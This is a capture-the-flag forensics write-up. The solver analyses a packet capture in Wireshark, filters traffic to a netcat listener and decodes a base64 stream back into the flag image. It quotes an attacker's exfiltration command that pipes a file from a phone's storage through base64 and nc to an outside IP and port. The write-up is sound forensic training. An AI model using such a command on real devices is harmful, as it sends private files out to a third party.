analyzing the file with wireshark, searching data field for the word "FCSC" doesnt yield anything
searching for flag gives an interesting command : 
`cat /sdcard/DCIM/flag.png | base64 | nc 172.18.0.1 1338`
so we analyze the data sent to that address at that port to get back the image
we put the following rule to see what the guy told us to do
ip.dst == 10.0.2.16 && ip.src == 172.18.0.1 && tcp.port == 1338
and this one to see what we replied
ip.src == 10.0.2.16 && ip.dst == 172.18.0.1 && tcp.port == 1338
we find a large amount of packets, with one stream being extremely long and base64-looking data
right clic > follow TCP stream gives us the whole b64 data, we save it as flag.b64
then it's just a matter of converting back to png until we can open it
`base64 -d flag.b64 > flag.png`
a cool cat and a flag (but no meme this time, our CEO is a serious guy :'()
